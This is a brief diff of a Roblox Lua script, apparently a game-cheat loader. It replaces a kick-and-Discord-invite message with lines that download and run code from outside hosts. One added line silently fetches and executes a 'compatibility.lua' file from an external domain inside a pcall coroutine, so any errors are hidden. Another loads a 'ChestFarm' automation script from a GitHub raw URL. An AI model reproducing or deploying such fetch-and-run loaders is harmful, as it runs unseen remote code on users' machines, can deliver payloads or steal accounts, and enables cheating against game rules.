@@ -1,2 +1,4 @@
-game.Players.LocalPlayer:Kick("join discord.gg/DGDjQn7c3w")
-setclipboard("discord.gg/DGDjQn7c3w")
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/7qtk0/script/main/ChestFarm.lua", true))(...)
